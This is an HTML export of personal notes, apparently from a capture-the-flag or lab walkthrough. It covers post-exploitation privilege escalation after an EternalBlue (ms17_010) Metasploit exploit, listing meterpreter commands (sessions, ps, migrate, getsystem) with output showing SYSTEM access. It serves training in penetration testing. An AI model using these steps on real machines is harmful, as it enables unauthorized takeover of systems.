<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4. Privilege Escalation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>4. Privilege Escalation</u></b></h1><br />a) Interatuate with our sessions.<br /><br /><br /><div class="codebox"><div class="codebox">msf5&nbsp;&gt;&nbsp;sessions&nbsp;-l<br />msf5&nbsp;&gt;&nbsp;exploit<span style="color:#ff9d00;font-weight:700">(</span>windows<span style="color:#ff9d00;font-weight:700">/</span>smb<span style="color:#ff9d00;font-weight:700">/</span>ms17_010_eternalblue<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&gt;&nbsp;sessions&nbsp;-i&nbsp;6<br /></div></div><br /><br />b) Let's see some info about the victim.<br /><br /><div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;sysinfo</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/215-1.png" alt="images/215-1.png" /><br /><br />c) Verify that we have escalated to “NT AUTHORITY\SYSTEM”.<br /><br /><div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;getuid</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><span style="background-color:#000000;">Server username: Dark-PC\Dark</span><br /><br />d) List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).<br /><br /><div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">ps</span></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/215-2.png" alt="images/215-2.png" /><br /><br />e) Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. <strong>If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. </strong><br /><br /><div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;migrate&nbsp;1980</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><span style="background-color:#000000;">[*] Migrating from 596 to 1980...<br />[*] Migration completed successfully.</span><br /><br />d) Elevate privileges.<br />We will let Metasploit try to do the heavy lifting for us by running “getsystem” without any options. The script will attempt every method available to it, stopping when it succeeds. Within the blink of an eye, our session is now running with SYSTEM privileges.<br /><br /><div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;getsystem</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><span style="background-color:#000000;">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br /><br />f) Check you are “NT AUTHORITY\SYSTEM”.<br /><br /><div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;getuid&nbsp;<br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><span style="background-color:#000000;">Server username: NT AUTHORITY\SYSTEM</span><br /><br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>